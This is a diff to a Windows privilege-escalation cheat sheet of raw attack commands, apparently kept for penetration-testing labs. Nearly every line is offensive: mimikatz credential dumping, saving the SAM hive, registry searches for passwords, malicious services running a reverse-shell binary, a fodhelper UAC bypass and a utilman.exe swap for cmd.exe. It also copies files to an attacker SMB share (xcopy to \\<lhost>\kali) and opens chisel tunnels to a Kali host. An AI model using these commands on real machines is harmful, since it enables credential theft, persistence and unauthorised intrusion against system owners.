@@ -28,24 +28,25 @@ netsh advfirewall show currentprofile
 netsh advfirewall firewall show rule name=all
 
 # tasks
+schtasks /query /fo LIST /v | findstr /c:"Task To Run:" /c:"TaskName:" /c:"Run As User:"
 schtasks /query /fo LIST /v
 schtasks
 
 # files
-dir network-secret.txt /s /p
 accesschk.exe -uws "Everyone" "C:\Program Files"
 mountvol
 dir /S /B
-robocopy . . /l /s /njh /njs /ns /lev:3
 CACLS file_path /e /p <user>:F # set full permissions to file
-icacls "C:\"
+icacls C:\*. # Print permissions
 accesschk.exe -uws "Everyone" "C:\Program Files"
 Get-ChildItem "C:\Program Files" -Recurse | Get-ACL | ?{$_.AccessToString -match "Everyone\sAllow\s\sModify"}
 dir *StickyNotes* /S /B
+
 net use u: \\<lhost>\kali /user:username password
 net use u: /d # unmount
 copy \\<lhost>\kali\<some-file> C:\Windows\tasks\<some-file>
 xcopy *.* \\<lhost>\kali /S /E
+robocopy . . /l /s /njh /njs /ns /lev:3
 
 # autostart writeable
 C:\Windows\tasks\accesschk.exe /accepteula -d "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
@@ -59,7 +60,8 @@ copy C:\Windows\tasks\rev.exe "C:\Program Files\Autorun Program\<autorun-exe>.ex
 # creds
 cmdkey /list -> runas /savecred /user:admin C:\Windows\tasks\rev.exe
 mimikatz64.exe "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
-reg query HKLM /f password /t REG_SZ /s
+reg query HKLM /f CurrentPass /t REG_SZ /s
+reg query HKLM /f pass /t REG_SZ /s
 
 ## sam / hive
 reg save HKLM\sam sam
@@ -72,12 +74,13 @@ reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallEle
 msiexec /quiet /qn /i C:\Windows\tasks\rev.msi
 
 # services
-sc create hacking binPath= "C:\windows\tasks\rev.exe"
-sc config hacking binpath="c:\windows\tasks\rev.exe" # set binpath
-wmic service hacking get Pathname
-sc query hacking 5000
-sc start hacking
-sc stop hacking
+sc.exe create hacking binPath="C:\windows\tasks\rev.exe"
+sc.exe config hacking binpath="c:\windows\tasks\rev.exe" # set binpath
+wmic service hacking get Pathname  # print executable path for hacking service  
+wmic service get name,Pathname     # print all service with name and executable path
+sc.exe query hacking 8192
+sc.exe start hacking
+sc.exe stop hacking
 
 ## unquoted path
 C:\Windows\tasks\accesschk.exe /accepteula -uwcqv user *
@@ -100,6 +103,11 @@ New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -
 Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "cmd.exe /c C:\windows\tasks\rev.exe" -Force
 Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden
 
+# rdp util exploit
+move C:\Windows\System32\utilman.exe C:\Windows\System32\utilman.old
+move C:\Windows\System32\cmd.exe C:\Windows\System32\utilman.exe
+rdesktop "$rhost"
+
 # tokens
 .\SweetPotato.exe -p rev.exe
 
@@ -109,4 +117,5 @@ powershell.exe -executionpolicy bypass -file some_file.ps1
 powershell.exe Start-Process cmd.exe -Verb runAs
 .\chisel_win86.exe client kali-docker:9999 R:socks
 .\chisel_win64.exe client kali-docker:9999 R:socks
+.\chisel_win64.exe client kali-docker:9999 R:5555:127.0.0.1:3306 # listen on kali 5555 and forward to victim to localhost on port 3306
 .\PsExec64.exe \\dc cmd.exe
